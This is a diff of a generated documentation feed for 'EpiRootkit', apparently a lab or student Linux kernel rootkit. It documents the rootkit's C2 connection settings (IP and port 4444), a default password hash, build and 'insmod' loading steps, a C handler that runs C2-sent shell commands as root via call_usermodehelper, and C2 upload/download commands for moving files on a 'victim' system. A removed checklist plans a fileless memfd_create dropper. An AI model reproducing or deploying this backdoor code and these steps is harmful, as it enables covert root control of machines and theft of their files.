+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Key settings in &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
  &lt;div class="flex-shrink-1 alert-icon">
  
  &lt;span class="material-icons size-20 me-2">
@@ -421,17 +501,15 @@ npm start&lt;/code>
  &lt;/div>
 &lt;ol>
 &lt;li>
-&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/04-epirootkit/connection-authentication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/connection-authentication/</guid><description>&lt;h2 id="todo-implement-connection--authentication-features">TODO: Implement Connection &amp;amp; Authentication Features &lt;a href="#todo-implement-connection--authentication-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Establish TCP connection to C2 server&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement persistent reconnection logic&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Add secure authentication handshake&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Handle authentication failures and retries&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document connection protocol and error handling&lt;/li>
-&lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;h1 id="epirootkit-deployment">EpiRootkit Deployment &lt;a href="#epirootkit-deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 20.04 VM. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/vm-installation/'>&lt;p>SETUP&lt;/p>&lt;strong>VM Installation &amp; Verification&lt;/strong>&lt;br>Set up and verify the attacker and victim VMs from scratch.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/vm-installation/">VM Installation&lt;/a> first.&lt;/p>
-&lt;/blockquote>
-&lt;h2 id="1-install-build-tools-and-kernel-headers">1. Install Build Tools and Kernel Headers &lt;a href="#1-install-build-tools-and-kernel-headers" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/04-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication.&lt;/p>
+&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-connection">Automatic Connection &lt;a href="#automatic-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
+&lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
+&lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
+&lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
+&lt;/ol>
+&lt;h3 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -446,105 +524,606 @@ npm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="69caee5" class="language-bash ">
- &lt;code>sudo apt update
-sudo apt install -y build-essential linux-headers-$(uname -r) git&lt;/code>
+ &lt;pre id="60de145" class="language-c ">
+ &lt;code>// rootkit/core/config.h
+#define C2_SERVER_IP &amp;#34;192.168.64.1&amp;#34;
+#define C2_SERVER_PORT 4444
+#define KEEPALIVE_INTERVAL_MS 60000
+#define RECONNECT_DELAY_MS 5000&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;blockquote>
+&lt;h2 id="network-architecture">Network Architecture &lt;a href="#network-architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-layer-system">Three-Layer System &lt;a href="#three-layer-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Connection Management&lt;/strong> (&lt;code>connection.c&lt;/code>) - High-level coordination&lt;/li>
+&lt;li>&lt;strong>Keepalive System&lt;/strong> (&lt;code>keepalive.c&lt;/code>) - Health monitoring&lt;/li>
+&lt;li>&lt;strong>Socket Management&lt;/strong> (&lt;code>socket.c&lt;/code>) - Low-level network operations&lt;/li>
+&lt;/ol>
+&lt;h3 id="connection-states">Connection States &lt;a href="#connection-states" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;code>0&lt;/code> = DISCONNECTED&lt;/li>
+&lt;li>&lt;code>1&lt;/code> = CONNECTED&lt;/li>
+&lt;li>&lt;code>2&lt;/code> = CONNECTING&lt;/li>
+&lt;/ul>
+&lt;h2 id="authentication-system">Authentication System &lt;a href="#authentication-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>auth Client-1 password&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Plain text password&lt;/li>
+&lt;li>&lt;strong>Rootkit hashes&lt;/strong>: Using SHA-512 kernel crypto API&lt;/li>
+&lt;li>&lt;strong>Compares hash&lt;/strong>: Against stored hash in config&lt;/li>
+&lt;li>&lt;strong>Returns result&lt;/strong>: SUCCESS or ERROR&lt;/li>
+&lt;/ol>
+&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
-&lt;div class="alert alert-info d-flex" role="alert">
- &lt;div class="flex-shrink-1 alert-icon">
+
  
- &lt;span class="material-icons size-20 me-2">
- info
- &lt;/span>&lt;/div>
  
- &lt;div class="w-100">Check your kernel version with &lt;code>uname -r&lt;/code>. The headers must match exactly!&lt;/div>
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="063008f" class="language-c ">
+ &lt;code>// Default password is &amp;#34;password&amp;#34; (SHA-512 hash stored in config)
+#define PASSWORD_HASH &amp;#34;b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86&amp;#34;&lt;/code>
+ &lt;/pre>
  &lt;/div>
-&lt;/blockquote>
-&lt;h2 id="2-clone-or-copy-the-project">2. Clone or Copy the Project &lt;a href="#2-clone-or-copy-the-project" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If not already present, copy the &lt;code>rootkit/&lt;/code> directory into your VM, or clone your repository.&lt;/p></description></item><item><title>Security Interaction with C2</title><link>/docs/04-epirootkit/security-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/security-interaction/</guid><description>&lt;h2 id="todo-implement-security-interaction-features">TODO: Implement Security Interaction Features &lt;a href="#todo-implement-security-interaction-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Enforce encrypted communication for all C2 interactions&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement strict authentication and authorization checks&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add protocol validation and error handling&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document all security protocols and best practices&lt;/li>
+&lt;h3 id="security-features">Security Features &lt;a href="#security-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Rate limiting&lt;/strong>: 5 attempts per 60 seconds&lt;/li>
+&lt;li>&lt;strong>Session timeout&lt;/strong>: 1 hour automatic expiry&lt;/li>
+&lt;li>&lt;strong>Secure hashing&lt;/strong>: SHA-512 using kernel crypto API&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/command-execution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/command-execution/</guid><description>&lt;h2 id="todo-implement-command-execution-features">TODO: Implement Command Execution Features &lt;a href="#todo-implement-command-execution-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Parse and validate incoming command messages&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Execute commands securely in kernel/user space&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Capture and return stdout, stderr, and exit code&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Handle command errors and edge cases&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test command execution end-to-end&lt;/li>
+&lt;h2 id="live-demo">Live Demo &lt;a href="#live-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="44e0d15" class="language-bash ">
+ &lt;code>cd attacking_program &amp;amp;&amp;amp; pnpm start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-load-rootkit">2. Load Rootkit &lt;a href="#2-load-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="69c6f95" class="language-bash ">
+ &lt;code>sudo insmod epirootkit.ko&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>C2 server shows:&lt;/strong>&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
+&lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
+&lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
+&lt;li>&lt;strong>Architecture&lt;/strong>: x86_64&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;h2 id="todo-implement-command-execution-features">TODO: Implement Command Execution Features &lt;a href="#todo-implement-command-execution-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Parse and validate incoming command messages&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Execute commands securely in kernel/user space&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Capture and return stdout, stderr, and exit code&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Handle command errors and edge cases&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test command execution end-to-end&lt;/li>
+&lt;h3 id="dependencies">Dependencies &lt;a href="#dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f1f2f46" class="language-bash ">
+ &lt;code>sudo apt update
+sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="build-process">Build Process &lt;a href="#build-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-navigate-to-rootkit-directory">1. Navigate to Rootkit Directory &lt;a href="#1-navigate-to-rootkit-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="4cc85a3" class="language-bash ">
+ &lt;code>cd rootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-build-the-module">2. Build the Module &lt;a href="#2-build-the-module" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7e536ba" class="language-bash ">
+ &lt;code>make clean &amp;amp;&amp;amp; make&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Expected output:&lt;/strong>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>exec Client-1 whoami&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Command string via network&lt;/li>
+&lt;li>&lt;strong>Executes command&lt;/strong>: Using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Captures output&lt;/strong>: Redirects stdout/stderr to temporary file&lt;/li>
+&lt;li>&lt;strong>Returns result&lt;/strong>: Exit code and output back to C2&lt;/li>
+&lt;/ol>
+&lt;h2 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="execution-method">Execution Method &lt;a href="#execution-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>API&lt;/strong>: &lt;code>call_usermodehelper()&lt;/code> (kernel 5.4.0 compatible)&lt;/li>
+&lt;li>&lt;strong>Shell&lt;/strong>: &lt;code>/bin/sh -c &amp;quot;command&amp;quot;&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Privileges&lt;/strong>: Runs with root privileges&lt;/li>
+&lt;li>&lt;strong>Output capture&lt;/strong>: Temporary files in &lt;code>/tmp/epirootkit_out_*&lt;/code>&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;h2 id="todo-implement-connection-features">TODO: Implement Connection Features &lt;a href="#todo-implement-connection-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Establish and maintain TCP connection to C2&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement reconnection and keepalive logic&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Handle connection errors and timeouts&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document connection protocol and troubleshooting&lt;/li>
+&lt;h3 id="limits">Limits &lt;a href="#limits" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Command length&lt;/strong>: 1024 bytes (MAX_COMMAND_LENGTH)&lt;/li>
+&lt;li>&lt;strong>Output size&lt;/strong>: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation&lt;/li>
+&lt;li>&lt;strong>Timeout&lt;/strong>: No timeout (commands run to completion)&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;h2 id="todo-implement-crypto-features">TODO: Implement Crypto Features &lt;a href="#todo-implement-crypto-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Add AES-256-GCM encryption for all communications&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Securely manage and store encryption keys&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement message authentication and integrity checks&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document crypto implementation and security considerations&lt;/li>
+&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3cdec3e" class="language-bash ">
+ &lt;code># System information
+c2-server$ exec Client-1 whoami
+# Exit code: 0
+# Output:
+# root
+
+c2-server$ exec Client-1 uname -a
+# Exit code: 0
+# Output:
+# Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="command-processing">Command Processing &lt;a href="#command-processing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="bd8b674" class="language-c ">
+ &lt;code>// Simplified version of the actual implementation
+static int handle_exec(const char *data)
+{
+ char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
+ char *envp[] = { 
+ &amp;#34;HOME=/&amp;#34;, 
+ &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
+ &amp;#34;TERM=xterm&amp;#34;,
+ NULL 
+ };
+ 
+ // Generate unique temporary filename
+ snprintf(temp_filename, sizeof(temp_filename), 
+ &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
+ 
+ // Build command with output redirection
+ snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
+ &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
+ 
+ // Execute command
+ ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+ 
+ // Read output from temporary file
+ // ... (file reading logic)
+ 
+ return send_result(formatted_result);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="output-capture">Output Capture &lt;a href="#output-capture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Redirection&lt;/strong>: &lt;code>command &amp;gt; /tmp/epirootkit_out_X 2&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
+&lt;li>&lt;strong>File reading&lt;/strong>: &lt;code>kernel_read()&lt;/code> to get output&lt;/li>
+&lt;li>&lt;strong>Dynamic allocation&lt;/strong>: &lt;code>vmalloc()&lt;/code> for large outputs&lt;/li>
+&lt;li>&lt;strong>Cleanup&lt;/strong>: Automatic temporary file removal&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Remote Exec &amp; File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 11 May 2025 18:35:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h2 id="todo-implement-file-transfer-features">TODO: Implement File Transfer Features &lt;a href="#todo-implement-file-transfer-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Define protocol for file upload/download (C2 and web UI stubbed)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement file write/read in kernel (e.g., using &lt;code>filp_open&lt;/code>, &lt;code>kernel_write&lt;/code>, &lt;code>kernel_read&lt;/code>) (WIP)&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Add CLI/Web UI commands for upload/download (UI present, backend partial)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Handle errors and edge cases (permissions, disk space, etc.)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test file transfer end-to-end (various file sizes, error cases)&lt;/li>
+&lt;h2 id="security-considerations">Security Considerations &lt;a href="#security-considerations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="privileges">Privileges &lt;a href="#privileges" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Root execution&lt;/strong>: All commands run with kernel-level privileges&lt;/li>
+&lt;li>&lt;strong>No sandboxing&lt;/strong>: Commands have full system access&lt;/li>
+&lt;li>&lt;strong>Logging&lt;/strong>: All commands logged to kernel log via &lt;code>pr_info()&lt;/code>&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Fileless Dropper &amp; Rootkit Loader</title><link>/docs/04-epirootkit/features/fileless-dropper-loader/</link><pubDate>Sun, 11 May 2025 18:15:00 +0100</pubDate><guid>/docs/04-epirootkit/features/fileless-dropper-loader/</guid><description>&lt;h2 id="todo-implement-fileless-dropper--loader">TODO: Implement Fileless Dropper &amp;amp; Loader &lt;a href="#todo-implement-fileless-dropper--loader" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement in-memory ELF staging using &lt;code>memfd_create&lt;/code>&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Develop loader to extract and decompress kernel image&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement symbol resolution and LKM insertion&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add secure cleanup of temporary files and processes&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Integrate dropper/loader with C2 workflow&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test on supported kernels and document limitations&lt;/li>
+&lt;h3 id="limitations">Limitations &lt;a href="#limitations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>No interactive commands&lt;/strong>: Cannot handle commands requiring user input&lt;/li>
+&lt;/ul></description></item><item><title>File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-process">Upload Process &lt;a href="#upload-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>C2 reads local file&lt;/strong> and sends content&lt;/li>
+&lt;li>&lt;strong>Rootkit receives&lt;/strong> filename and content&lt;/li>
+&lt;li>&lt;strong>Creates file&lt;/strong> on victim system using &lt;code>filp_open()&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Writes content&lt;/strong> using &lt;code>kernel_write()&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h3 id="download-process">Download Process &lt;a href="#download-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>C2 requests file&lt;/strong> by path&lt;/li>
+&lt;li>&lt;strong>Rootkit opens file&lt;/strong> using &lt;code>filp_open()&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Reads content&lt;/strong> using &lt;code>kernel_read()&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Sends content&lt;/strong> back to C2 server&lt;/li>
+&lt;/ol>
+&lt;h2 id="upload-feature">Upload Feature &lt;a href="#upload-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage">Basic Usage &lt;a href="#basic-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="a949028" class="language-bash ">
+ &lt;code># Upload file to specific path
+c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
+# ✓ File uploaded successfully (1024 bytes)
+
+# Upload to current directory (uses basename)
+c2-server$ upload Client-1 ./script.sh
+# ✓ File uploaded successfully (512 bytes) -&amp;gt; ./script.sh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
